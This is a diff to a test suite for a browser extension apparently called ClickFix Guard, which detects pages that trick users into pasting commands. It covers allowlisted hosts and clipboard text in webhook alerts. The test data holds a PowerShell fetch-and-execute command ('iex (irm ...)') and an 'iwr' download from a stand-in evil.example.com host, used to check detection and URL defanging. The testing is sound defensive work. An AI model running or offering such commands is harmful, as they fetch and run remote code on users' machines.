@@ -281,7 +281,8 @@ def run(b):
 
     if group("hosts: built-in allowlist and neverAllowlist"):
         for host in ("code.claude.com", "claude.ai", "chatgpt.com", "gemini.google.com", "translate.google.com", "docs.google.com",
-                     "chat.google.com", "www.google.com", "app.notion.com", "brew.sh"):
+                     "chat.google.com", "www.google.com", "app.notion.com", "brew.sh", "ollama.com", "opencode.ai",
+                     "antigravity.google", "web.whatsapp.com", "console.aws.amazon.com"):
             check(host + " → silent", b.visit(url(host, LEVEL2), CLICK2), False)
         for host in ("sites.google.com", "lure.pages.dev", "abc.claudeusercontent.com", "evil.github.io", "accounts.google.com"):
             tid, s = b.open(url(host, LEVEL2))
@@ -340,6 +341,36 @@ def run(b):
         msg = b.ev(b.sw, "(() => { const real = chrome.i18n.getMessage; chrome.i18n.getMessage = () => ''; try { return slackMessage({ url: 'https://x.example.com/', score: 5, "
                          "indicators: [], time: 0, installId: 'abcdefgh' }).blocks[0].text.text } finally { chrome.i18n.getMessage = real } })()")
         check("slack labels survive chrome.i18n returning ''", all(x in msg for x in ("ClickFix Guard detection", "*Page:*", "*Score:*", "*Browser:*")))
+
+    if group("copied text in webhook messages (includeClipboardText)"):
+        hooks.clear()
+        b.visit(url(lure, LEVEL2), CLICK2)
+        time.sleep(0.5)
+        check("off by default: no clipboardText in the payload", bool(hooks) and "clipboardText" not in hooks[-1])
+        check("…and never in the extension's own log", b.ev(b.sw, "chrome.storage.local.get({log: []}).then(v => v.log.some(e => 'clipboardText' in e))"), False)
+        # chrome.storage.managed can't be set from a test; stand in for the Admin console.
+        check("stand-in for the Admin console installed",
+              b.ev(b.sw, "(self.__realReadManaged = readManaged, readManaged = async () => ({ includeClipboardText: true }), true)"))
+        hooks.clear()
+        b.visit(url(lure, LEVEL2), CLICK2)
+        time.sleep(0.5)
+        check("on: the command the page copied is in the payload", (hooks[-1].get("clipboardText") if hooks else None),
+              "powershell -NoProfile -Command \"iex (irm 'https://www.google.com')\"")
+        hooks.clear()
+        b.visit(url(lure, "/level1-basic.html"))
+        time.sleep(0.5)
+        check("on, but a text-only detection → no clipboardText", bool(hooks) and "clipboardText" not in hooks[-1])
+        b.ev(b.sw, "(readManaged = self.__realReadManaged, true)")
+        f = b.ev(b.sw, "clipboardFields({ includeClipboardText: true }, 'a'.repeat(600))")
+        check("cut to 500 characters and flagged", (len(f.get("clipboardText", "")), f.get("clipboardTextTruncated")), (500, True))
+        check("includeClipboardText must be exactly true", b.ev(b.sw, "Object.keys(clipboardFields({ includeClipboardText: 'yes' }, 'x')).length"), 0)
+        blocks = b.ev(b.sw, "slackMessage({ url: 'https://x.example.com/', score: 9, indicators: [], time: 0, clipboardTextTruncated: true, "
+                            "clipboardText: 'iwr https://evil.example.com/a.ps1 <!channel> & ```x``` @here' }).blocks")
+        code = blocks[1]["text"]["text"] if len(blocks) > 1 else ""
+        check("slack: copied text in its own block", len(blocks), 2)
+        check("slack: URL defanged, <>& escaped, ``` broken up", all(x in code for x in ("hxxps://evil[.]example[.]com/a[.]ps1", "&lt;!channel&gt;", "&amp;", "`\u200b``x`\u200b``")))
+        check("slack: block opens and closes exactly once", (code.count("```"), code.endswith("```")), (2, True))
+        check("slack: truncation noted", "500" in code.split("\n")[0])
 
     if group("copying still works through the hooks"):
         b.call("Browser.grantPermissions", {"permissions": ["clipboardReadWrite", "clipboardSanitizedWrite"], "origin": url("clip.example.test", "")})
